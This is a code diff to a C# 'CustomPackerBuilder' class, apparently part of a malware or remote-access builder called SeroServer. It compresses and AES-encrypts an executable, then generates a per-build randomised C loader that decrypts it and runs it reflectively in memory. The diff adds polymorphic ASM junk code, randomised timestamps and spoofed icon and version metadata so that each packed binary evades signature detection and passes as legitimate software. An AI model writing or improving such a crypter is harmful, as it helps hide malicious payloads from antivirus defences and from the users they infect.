@@ -1,6 +1,7 @@
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Text;
 
 namespace SeroServer.Builder;
 
@@ -9,50 +10,41 @@ namespace SeroServer.Builder;
 /// randomised C loader (junk dead-code, AES decrypt via BCrypt, LZNT1 decompress,
 /// in-memory PE map + CreateThread at entry point — no child process spawned).
 /// Each build produces a unique binary: different junk symbols, random AES key/IV,
-/// random PE timestamp.
+/// random PE timestamp, polymorphic x64 ASM junk functions.
 /// </summary>
 public static class CustomPackerBuilder
 {
-    // ── Win32 LZNT1 compression ───────────────────────────────────────────────────
+    // ── LZMS compression (Cabinet API — best ratio of all native Windows algorithms) ──
 
-    [DllImport("ntdll.dll")]
-    private static extern int RtlGetCompressionWorkSpaceSize(
-        ushort CompressionFormatAndEngine,
-        out uint CompressBufferWorkSpaceSize,
-        out uint CompressFragmentWorkSpaceSize);
+    [DllImport("cabinet.dll", SetLastError = true)]
+    private static extern bool CreateCompressor(uint Algorithm, nint AllocationRoutines, out nint CompressorHandle);
 
-    [DllImport("ntdll.dll")]
-    private static extern int RtlCompressBuffer(
-        ushort CompressionFormatAndEngine,
-        byte[] UncompressedBuffer, uint UncompressedBufferSize,
-        byte[] CompressedBuffer,   uint CompressedBufferSize,
-        uint   UncompressedChunkSize,
-        out uint FinalCompressedSize,
-        nint WorkSpace);
+    [DllImport("cabinet.dll", SetLastError = true)]
+    private static extern bool Compress(nint CompressorHandle,
+        byte[] UncompressedData, nint UncompressedDataSize,
+        byte[] CompressedBuffer, nint CompressedBufferSize,
+        out nint CompressedDataSize);
 
-    private const ushort COMPRESSION_FORMAT_LZNT1   = 2;
-    private const ushort COMPRESSION_ENGINE_MAXIMUM = 0x0100;
+    [DllImport("cabinet.dll")]
+    private static extern bool CloseCompressor(nint CompressorHandle);
+
+    private const uint COMPRESS_ALGORITHM_LZMS = 5;
 
     private static byte[] Compress(byte[] data, Action<string> log)
     {
-        ushort fmt = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM;
-        int st = RtlGetCompressionWorkSpaceSize(fmt, out uint wsSize, out _);
-        if (st != 0) throw new InvalidOperationException($"RtlGetCompressionWorkSpaceSize: 0x{st:X}");
-
-        var ws  = Marshal.AllocHGlobal((int)wsSize);
-        var dst = new byte[data.Length * 2 + 4096];
+        if (!CreateCompressor(COMPRESS_ALGORITHM_LZMS, 0, out nint hComp))
+            throw new InvalidOperationException($"CreateCompressor(LZMS) failed: {Marshal.GetLastWin32Error()}");
+        var dst = new byte[data.Length * 2 + 65536];
         try
         {
-            st = RtlCompressBuffer(fmt, data, (uint)data.Length,
-                                   dst, (uint)dst.Length, 4096,
-                                   out uint finalSize, ws);
-            if (st != 0) throw new InvalidOperationException($"RtlCompressBuffer: 0x{st:X}");
-            var result = new byte[finalSize];
+            if (!Compress(hComp, data, (nint)data.Length, dst, (nint)dst.Length, out nint finalSize))
+                throw new InvalidOperationException($"Compress(LZMS) failed: {Marshal.GetLastWin32Error()}");
+            var result = new byte[(int)finalSize];
             Array.Copy(dst, result, (int)finalSize);
-            log($"[*] CustomPacker: LZNT1 {data.Length / 1024:N0} KB → {result.Length / 1024:N0} KB ({100.0 * result.Length / data.Length:F0}%)");
+            log($"[*] CustomPacker: LZMS {data.Length / 1024:N0} KB → {result.Length / 1024:N0} KB ({100.0 * result.Length / data.Length:F0}%)");
             return result;
         }
-        finally { Marshal.FreeHGlobal(ws); }
+        finally { CloseCompressor(hComp); }
     }
 
     // ── AES-256-CBC encryption ────────────────────────────────────────────────────
@@ -74,7 +66,7 @@ public static class CustomPackerBuilder
 
     private static string ToCArray(byte[] data, string name)
     {
-        var sb = new System.Text.StringBuilder();
+        var sb = new StringBuilder();
         sb.Append($"static const unsigned char {name}[] = {{");
         for (int i = 0; i < data.Length; i++)
         {
@@ -93,11 +85,178 @@ public static class CustomPackerBuilder
         return prefix + new string(buf.Select(b => chars[b % chars.Length]).ToArray());
     }
 
+    private static ulong Rnd64() =>
+        BitConverter.ToUInt64(RandomNumberGenerator.GetBytes(8));
+
+    private static byte RndRot() =>
+        (byte)(RandomNumberGenerator.GetBytes(1)[0] % 61 + 1);  // 1..61
+
+    // ── MASM64 polymorphic ASM junk ───────────────────────────────────────────────
+
+    private static (string asmSource, string fn1, string fn2, string fn3)
+        GenerateAsmJunk()
+    {
+        string fn1 = Rnd("_za");
+        string fn2 = Rnd("_zb");
+        string fn3 = Rnd("_zc");
+
+        ulong i1a = Rnd64(), i1b = Rnd64(), i1c = Rnd64();
+        ulong i2a = Rnd64(), i2b = Rnd64();
+        ulong i3a = Rnd64(), i3b = Rnd64(), i3c = Rnd64();
+        byte r1 = RndRot(), r2 = RndRot(), r3 = RndRot(), r4 = RndRot();
+
+        var src = $$"""
+; Polymorphic x64 ASM dead-code — unique per build
+PUBLIC {{fn1}}
+PUBLIC {{fn2}}
+PUBLIC {{fn3}}
+
+.code
+
+; Function 1: integer register arithmetic junk
+{{fn1}} PROC
+    push rbx
+    push rdi
+    push rsi
+    sub  rsp, 28h
+    xor  rax, rax
+    mov  rbx, 0{{i1a:X16}}h
+    mov  rdi, 0{{i1b:X16}}h
+    xor  rbx, rdi
+    ror  rbx, {{r1}}
+    imul rbx, rbx, 5
+    mov  rsi, 0{{i1c:X16}}h
+    rol  rsi, {{r2}}
+    add  rdi, rsi
+    xor  rbx, rdi
+    mov  rax, rbx
+    add  rsp, 28h
+    pop  rsi
+    pop  rdi
+    pop  rbx
+    ret
+{{fn1}} ENDP
+
+; Function 2: stack-memory junk
+{{fn2}} PROC
+    push rbp
+    push r12
+    push r13
+    sub  rsp, 40h
+    mov  r12, 0{{i2a:X16}}h
+    mov  r13, 0{{i2b:X16}}h
+    xor  r12, r13
+    ror  r12, {{r3}}
+    mov  rbp, rsp
+    add  rbp, 60h
+    mov  QWORD PTR [rbp - 8],  r12
+    mov  QWORD PTR [rbp - 16], r13
+    mov  rax, QWORD PTR [rbp - 8]
+    add  rax, QWORD PTR [rbp - 16]
+    imul rax, rax, 3
+    xor  r12, rax
+    mov  rax, r12
+    add  rsp, 40h
+    pop  r13
+    pop  r12
+    pop  rbp
+    ret
+{{fn2}} ENDP
+
+; Function 3: bit-manipulation chain junk
+{{fn3}} PROC
+    push rbx
+    push rcx
+    push rdx
+    sub  rsp, 28h
+    mov  rbx, 0{{i3a:X16}}h
+    mov  rcx, 0{{i3b:X16}}h
+    mov  rdx, 0{{i3c:X16}}h
+    xor  rbx, rcx
+    rol  rbx, {{r4}}
+    imul rcx, rdx, 7
+    xor  rdx, rbx
+    add  rcx, rdx
+    ror  rcx, {{r1}}
+    xor  rbx, rcx
+    not  rbx
+    mov  rax, rbx
+    add  rsp, 28h
+    pop  rdx
+    pop  rcx
+    pop  rbx
+    ret
+{{fn3}} ENDP
+
+END
+
+""";
+        return (src, fn1, fn2, fn3);
+    }
+
+    // ── Resource file (icon + version info) ──────────────────────────────────────
+
+    private static string GenerateResourceSource(string? iconPath, LoaderMetadata? meta, string exeName)
+    {
+        var sb = new StringBuilder();
+        sb.AppendLine("#include <windows.h>");
+        if (!string.IsNullOrEmpty(iconPath))
+            sb.AppendLine($"1 ICON \"{iconPath!.Replace("\\", "\\\\")}\"");
+        if (meta != null)
+        {
+            var fv = ParseVersion(meta.FileVersion ?? "1.0.0.0");
+            var pv = ParseVersion(meta.ProductVersion ?? meta.FileVersion ?? "1.0.0.0");
+            sb.AppendLine($$"""
+VS_VERSION_INFO VERSIONINFO
+FILEVERSION {{fv}}
+PRODUCTVERSION {{pv}}
+FILEFLAGSMASK VS_FFI_FILEFLAGSMASK
+FILEFLAGS 0x0L
+FILEOS VOS__WINDOWS32
+FILETYPE VFT_APP
+FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "{{EscRc(meta.CompanyName)}}"
+            VALUE "FileDescription",  "{{EscRc(meta.FileDescription)}}"
+            VALUE "FileVersion",      "{{EscRc(meta.FileVersion)}}"
+            VALUE "InternalName",     "{{EscRc(Path.GetFileNameWithoutExtension(exeName))}}"
+            VALUE "LegalCopyright",   "{{EscRc(meta.Copyright)}}"
+            VALUE "OriginalFilename", "{{EscRc(exeName)}}"
+            VALUE "ProductName",      "{{EscRc(meta.ProductName)}}"
+            VALUE "ProductVersion",   "{{EscRc(meta.ProductVersion)}}"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0409, 0x04B0
+    END
+END
+""");
+        }
+        return sb.ToString();
+    }
+
+    private static string ParseVersion(string? v)
+    {
+        var parts = (v ?? "1.0.0.0").Split('.').Take(4).Select(p =>
+            int.TryParse(p, out int n) ? n : 0).ToArray();
+        while (parts.Length < 4) parts = [.. parts, 0];
+        return $"{parts[0]},{parts[1]},{parts[2]},{parts[3]}";
+    }
+
+    private static string EscRc(string? s) =>
+        (s ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"");
+
     // ── C loader source ───────────────────────────────────────────────────────────
 
     private static string GenerateLoaderSource(
         byte[] cipher, byte[] key, byte[] iv,
-        uint compressedLen, uint originalLen)
+        uint compressedLen, uint originalLen,
+        string fnAsm1, string fnAsm2, string fnAsm3)
     {
         string fnAes  = Rnd("_a");
         string fnDcmp = Rnd("_b");
@@ -105,17 +264,19 @@ public static class CustomPackerBuilder
         string fnJunk = Rnd("_j");
         string varX   = Rnd("x_");
         string varY   = Rnd("y_");
-        uint jk1 = RandomNumberGenerator.GetBytes(4).Aggregate(0u, (a, b) => (a << 8) | b);
-        uint jk2 = RandomNumberGenerator.GetBytes(4).Aggregate(0u, (a, b) => (a << 8) | b);
+        uint jk1 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
+        uint jk2 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
+        uint jk3 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
 
         return $$"""
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <bcrypt.h>
+#include <compressapi.h>
 #include <stdint.h>
 #include <string.h>
 #pragma comment(lib, "bcrypt.lib")
-#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "cabinet.lib")
 
 {{ToCArray(cipher, "g_enc")}}
 {{ToCArray(key,    "g_key")}}
@@ -123,11 +284,17 @@ public static class CustomPackerBuilder
 static const unsigned int g_cmp_size = {{compressedLen}}U;
 static const unsigned int g_org_size = {{originalLen}}U;
 
-/* ── Junk dead-code — different every build ── */
+/* ── ASM junk (extern — defined in junk.asm, different every build) ── */
+extern unsigned long long {{fnAsm1}}(void);
+extern unsigned long long {{fnAsm2}}(void);
+extern unsigned long long {{fnAsm3}}(void);
+
+/* ── C junk dead-code — optimizer disabled ── */
 #pragma optimize("", off)
 static __declspec(noinline) unsigned int {{fnJunk}}(unsigned int {{varX}}) {
     volatile unsigned int {{varY}} = {{varX}} ^ 0x{{jk1:X8}}U;
     for (int i = 0; i < 4; i++) {{varY}} = ({{varY}} >> 1) | ({{varY}} << 31);
+    if ({{varY}} > 0x{{jk2:X8}}U) { {{varY}} ^= 0x{{jk3:X8}}U; {{varY}} += {{varX}}; }
     return {{varY}} ^ 0x{{jk2:X8}}U;
 }
 #pragma optimize("", on)
@@ -156,17 +323,16 @@ done:
     return out;
 }
 
-/* ── LZNT1 decompress ── */
-typedef NTSTATUS(NTAPI* PFN_DCMP)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);
-static unsigned char* {{fnDcmp}}(const unsigned char* src, unsigned int src_len, unsigned int out_len) {
-    PFN_DCMP fn = (PFN_DCMP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlDecompressBuffer");
-    if (!fn) return NULL;
+/* ── LZMS decompress (Cabinet API — best native Windows ratio) ── */
+static unsigned char* {{fnDcmp}}(const unsigned char* src, SIZE_T src_len, SIZE_T out_len) {
+    DECOMPRESSOR_HANDLE hDec = NULL;
+    if (!CreateDecompressor(COMPRESS_ALGORITHM_LZMS, NULL, &hDec)) return NULL;
     unsigned char* out = (unsigned char*)VirtualAlloc(NULL, out_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-    if (!out) return NULL;
-    ULONG final = 0;
-    if (fn(0x0002, out, out_len, (PUCHAR)src, src_len, &final) != 0 || final != out_len) {
-        VirtualFree(out, 0, MEM_RELEASE); return NULL;
-    }
+    if (!out) { CloseDecompressor(hDec); return NULL; }
+    SIZE_T final = 0;
+    BOOL ok = Decompress(hDec, (PVOID)src, src_len, out, out_len, &final);
+    CloseDecompressor(hDec);
+    if (!ok || final != out_len) { VirtualFree(out, 0, MEM_RELEASE); return NULL; }
     return out;
 }
 
@@ -187,14 +353,12 @@ static int {{fnRun}}(unsigned char* pe, unsigned int pe_len) {
 
     ULONG_PTR delta = (ULONG_PTR)base - preferred;
 
-    /* Headers + sections */
     memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);
     IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)((UCHAR*)nt + sizeof(IMAGE_NT_HEADERS64));
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
         if (sec[i].SizeOfRawData)
             memcpy((UCHAR*)base + sec[i].VirtualAddress, pe + sec[i].PointerToRawData, sec[i].SizeOfRawData);
 
-    /* Relocations */
     if (delta && nt->OptionalHeader.DataDirectory[5].Size) {
         IMAGE_BASE_RELOCATION* rel = (IMAGE_BASE_RELOCATION*)((UCHAR*)base + nt->OptionalHeader.DataDirectory[5].VirtualAddress);
         while (rel->VirtualAddress) {
@@ -209,7 +373,6 @@ static int {{fnRun}}(unsigned char* pe, unsigned int pe_len) {
         }
     }
 
-    /* IAT */
     if (nt->OptionalHeader.DataDirectory[1].Size) {
         IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)((UCHAR*)base + nt->OptionalHeader.DataDirectory[1].VirtualAddress);
         for (; imp->Name; imp++) {
@@ -226,7 +389,6 @@ static int {{fnRun}}(unsigned char* pe, unsigned int pe_len) {
         }
     }
 
-    /* Per-section memory protection */
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         DWORD ch = sec[i].Characteristics, prot = PAGE_READONLY, old = 0;
         if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE)) prot = PAGE_EXECUTE_READWRITE;
@@ -236,7 +398,6 @@ static int {{fnRun}}(unsigned char* pe, unsigned int pe_len) {
         VirtualProtect((UCHAR*)base + sec[i].VirtualAddress, sz, prot, &old);
     }
 
-    /* Run in a thread, wait for it */
     ULONG_PTR ep = (ULONG_PTR)base + nt->OptionalHeader.AddressOfEntryPoint;
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
     if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }
@@ -245,14 +406,18 @@ static int {{fnRun}}(unsigned char* pe, unsigned int pe_len) {
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
     (void)h; (void)p; (void)cmd; (void)show;
-    /* Touch junk function so the linker keeps it */
-    volatile unsigned int _d = {{fnJunk}}(GetCurrentProcessId()); (void)_d;
+
+    /* Touch all junk — forces linker to include them */
+    volatile unsigned int  _dc = {{fnJunk}}(GetCurrentProcessId());  (void)_dc;
+    volatile unsigned long long _d1 = {{fnAsm1}}(); (void)_d1;
+    volatile unsigned long long _d2 = {{fnAsm2}}(); (void)_d2;
+    volatile unsigned long long _d3 = {{fnAsm3}}(); (void)_d3;
 
     unsigned int plainLen = 0;
     unsigned char* compressed = {{fnAes}}(g_enc, g_enc_len, &plainLen);
     if (!compressed) return 1;
 
-    unsigned char* pe = {{fnDcmp}}(compressed, g_cmp_size, g_org_size);
+    unsigned char* pe = {{fnDcmp}}(compressed, (SIZE_T)g_cmp_size, (SIZE_T)g_org_size);
     VirtualFree(compressed, 0, MEM_RELEASE);
     if (!pe) return 1;
 
@@ -280,61 +445,149 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
         catch { }
     }
 
+    // ── Tool helpers ─────────────────────────────────────────────────────────────
+
+    private static string? FindRcExe(Dictionary<string, string> vsEnv)
+    {
+        if (vsEnv.TryGetValue("WindowsSdkBinPath", out var binPath) &&
+            vsEnv.TryGetValue("WindowsSDKVersion", out var sdkVer))
+        {
+            // vcvarsall sets WindowsSDKVersion with a trailing backslash
+            sdkVer = sdkVer.TrimEnd('\\', '/');
+            var rc = Path.Combine(binPath, sdkVer, "x64", "rc.exe");
+            if (File.Exists(rc)) return rc;
+        }
+        var kits = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
+            "Windows Kits", "10", "bin");
+        if (Directory.Exists(kits))
+            foreach (var ver in Directory.GetDirectories(kits).OrderByDescending(x => x))
+            {
+                var rc = Path.Combine(ver, "x64", "rc.exe");
+                if (File.Exists(rc)) return rc;
+            }
+        return null;
+    }
+
+    private static async Task<bool> RunAsync(
+        string exe, string args,
+        Dictionary<string, string>? env,
+        Action<string> log,
+        string label)
+    {
+        var psi = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName               = exe,
+            Arguments              = args,
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            UseShellExecute        = false,
+            CreateNoWindow         = true,
+        };
+        if (env != null) foreach (var kv in env) psi.Environment[kv.Key] = kv.Value;
+        using var proc = System.Diagnostics.Process.Start(psi)!;
+        var stdout = await proc.StandardOutput.ReadToEndAsync();
+        var stderr = await proc.StandardError.ReadToEndAsync();
+        await proc.WaitForExitAsync();
+        if (proc.ExitCode != 0)
+        {
+            log($"[!] CustomPacker: {label} failed (exit {proc.ExitCode})");
+            if (!string.IsNullOrWhiteSpace(stdout)) log(stdout.TrimEnd());
+            if (!string.IsNullOrWhiteSpace(stderr)) log(stderr.TrimEnd());
+            return false;
+        }
+        return true;
+    }
+
     // ── Public entry point ────────────────────────────────────────────────────────
 
-    public static async Task ApplyAsync(string exePath, Action<string> log, LoaderMetadata? meta = null)
+    public static async Task ApplyAsync(
+        string exePath,
+        Action<string> log,
+        string?        iconPath = null,
+        LoaderMetadata? meta    = null)
     {
         log("[*] CustomPacker: Starting...");
         byte[] raw = await File.ReadAllBytesAsync(exePath);
         log($"[*] CustomPacker: Input {raw.Length / 1024:N0} KB");
 
         byte[] compressed = Compress(raw, log);
-
         var (cipher, key, iv) = EncryptAes(compressed);
         log($"[*] CustomPacker: AES-256-CBC encrypted ({cipher.Length / 1024:N0} KB)");
 
-        string src = GenerateLoaderSource(cipher, key, iv, (uint)compressed.Length, (uint)raw.Length);
+        var (asmSrc, fn1, fn2, fn3) = GenerateAsmJunk();
+        string loaderSrc = GenerateLoaderSource(cipher, key, iv,
+            (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3);
 
         string? clPath = FindClExe(log);
         if (clPath == null) { log("[!] CustomPacker: cl.exe not found — skipped."); return; }
 
+        var ml64Path = Path.Combine(Path.GetDirectoryName(clPath)!, "ml64.exe");
+        if (!File.Exists(ml64Path))
+        {
+            log("[!] CustomPacker: ml64.exe not found alongside cl.exe — skipped.");
+            return;
+        }
+
+        var vsEnv  = GetVsEnvironment(clPath);
         var tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
         Directory.CreateDirectory(tempDir);
         try
         {
-            var srcPath = Path.Combine(tempDir, "loader.c");
-            var outPath = Path.Combine(tempDir, "loader.exe");
-            await File.WriteAllTextAsync(srcPath, src);
+            // 1. Compile ASM junk → junk.obj
+            var asmPath = Path.Combine(tempDir, "junk.asm");
+            var objPath = Path.Combine(tempDir, "junk.obj");
+            await File.WriteAllTextAsync(asmPath, asmSrc);
+            var ok = await RunAsync(ml64Path,
+                $"/nologo /c /Fo\"{objPath}\" \"{asmPath}\"",
+                vsEnv, log, "ml64");
+            if (!ok || !File.Exists(objPath)) return;
+            log("[+] CustomPacker: x64 ASM junk compiled.");
 
-            var vsEnv = GetVsEnvironment(clPath);
-            var psi   = new System.Diagnostics.ProcessStartInfo
+            // 2. Compile RC resource (icon + version) if applicable
+            string resArg = "";
+            bool   hasResources = !string.IsNullOrEmpty(iconPath) || meta != null;
+            if (hasResources)
             {
-                FileName  = clPath,
-                Arguments = $"\"{srcPath}\" /O2 /GS- /MT /W0 /nologo /Fe\"{outPath}\" " +
-                            "kernel32.lib bcrypt.lib /link /SUBSYSTEM:WINDOWS /INCREMENTAL:NO /OPT:REF /OPT:ICF",
-                RedirectStandardOutput = true,
-                RedirectStandardError  = true,
-                UseShellExecute  = false,
-                CreateNoWindow   = true,
-            };
-            if (vsEnv != null) foreach (var kv in vsEnv) psi.Environment[kv.Key] = kv.Value;
-
-            using var proc = System.Diagnostics.Process.Start(psi)!;
-            var stdout = await proc.StandardOutput.ReadToEndAsync();
-            var stderr = await proc.StandardError.ReadToEndAsync();
-            await proc.WaitForExitAsync();
-
-            if (proc.ExitCode != 0 || !File.Exists(outPath))
-            {
-                log($"[!] CustomPacker: cl.exe failed (exit {proc.ExitCode})");
-                if (!string.IsNullOrWhiteSpace(stdout)) log(stdout.TrimEnd());
-                if (!string.IsNullOrWhiteSpace(stderr)) log(stderr.TrimEnd());
-                return;
+                var rcExe = vsEnv != null ? FindRcExe(vsEnv) : null;
+                if (rcExe != null)
+                {
+                    var rcSrc  = Path.Combine(tempDir, "loader.rc");
+                    var resOut = Path.Combine(tempDir, "loader.res");
+                    await File.WriteAllTextAsync(rcSrc,
+                        GenerateResourceSource(iconPath, meta, Path.GetFileName(exePath)));
+                    ok = await RunAsync(rcExe,
+                        $"/nologo /fo \"{resOut}\" \"{rcSrc}\"",
+                        vsEnv, log, "rc");
+                    if (ok && File.Exists(resOut))
+                    {
+                        resArg = $" \"{resOut}\"";
+                        log("[+] CustomPacker: resource (icon/version) compiled.");
+                    }
+                    else
+                        log("[~] CustomPacker: rc.exe failed — continuing without resources.");
+                }
+                else
+                    log("[~] CustomPacker: rc.exe not found — continuing without resources.");
             }
 
+            // 3. Compile C loader + link junk.obj [+ loader.res]
+            var srcPath = Path.Combine(tempDir, "loader.c");
+            var outPath = Path.Combine(tempDir, "loader.exe");
+            await File.WriteAllTextAsync(srcPath, loaderSrc);
+
+            ok = await RunAsync(clPath,
+                $"\"{srcPath}\" \"{objPath}\"{resArg} /O2 /GS- /MT /W0 /nologo " +
+                $"/Fe\"{outPath}\" kernel32.lib bcrypt.lib cabinet.lib " +
+                "/link /SUBSYSTEM:WINDOWS /INCREMENTAL:NO /OPT:REF /OPT:ICF",
+                vsEnv, log, "cl");
+            if (!ok || !File.Exists(outPath)) return;
+
             RandomisePeTimestamp(outPath);
+
             var packedSize = new FileInfo(outPath).Length;
-            log($"[+] CustomPacker: {raw.Length / 1024:N0} KB → {packedSize / 1024:N0} KB ({100.0 * packedSize / raw.Length:F0}%)");
+            var ratio = 100.0 * packedSize / raw.Length;
+            log($"[+] CustomPacker: {raw.Length / 1024:N0} KB → {packedSize / 1024:N0} KB ({ratio:F0}% of original)");
             File.Copy(outPath, exePath, overwrite: true);
             log($"[+] CustomPacker: Applied to {Path.GetFileName(exePath)}");
         }
